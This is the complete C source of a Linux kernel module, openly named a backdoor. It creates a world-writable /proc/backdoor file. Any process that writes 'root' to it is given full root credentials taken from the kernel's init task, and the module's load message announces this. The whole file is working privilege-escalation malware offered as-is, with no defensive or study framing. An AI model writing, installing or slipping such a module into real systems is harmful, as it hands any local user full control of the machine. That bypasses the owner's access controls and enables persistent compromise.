#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/sched.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Backdoor");
MODULE_DESCRIPTION("Getting root via procfs");
MODULE_VERSION("0.1");

#define MAGIC_CMD "root"
#define PROC_NAME "backdoor"

static struct proc_dir_entry *proc_entry;

extern struct task_struct init_task;

static ssize_t backdoor_write(struct file *file, const char __user *buffer, size_t count, loff_t *off)
{
    char buf[64] = {0};
    size_t len = min(count, sizeof(buf) - 1);

    if (len == 0) return 0;

    if (copy_from_user(buf, buffer, len)) return -EFAULT;

    buf[len] = '\0';
    if (buf[len-1] == '\n') buf[len-1] = '\0';

    if (strcmp(buf, MAGIC_CMD) == 0) {
        struct cred *new_creds;

        new_creds = prepare_kernel_cred(&init_task);
        if (!new_creds) {
            pr_err("backdoor: prepare_kernel_cred failed\n");
            return -ENOMEM;
        }

        commit_creds(new_creds);
        pr_info("backdoor: root granted to %d (%s)\n", current->pid, current->comm);
    }

    return count;
}

static const struct proc_ops proc_fops = {
    .proc_write = backdoor_write,
};

static int __init backdoor_init(void)
{
    proc_entry = proc_create(PROC_NAME, 0666, NULL, &proc_fops);
    if (!proc_entry) {
        pr_err("backdoor: failed to create /proc/%s\n", PROC_NAME);
        return -ENOMEM;
    }
    pr_info("backdoor: loaded. Write '%s' to /proc/%s to become root.\n", MAGIC_CMD, PROC_NAME);
    return 0;
}

static void __exit backdoor_exit(void)
{
    proc_remove(proc_entry);
    pr_info("backdoor: unloaded\n");
}

module_init(backdoor_init);
module_exit(backdoor_exit);
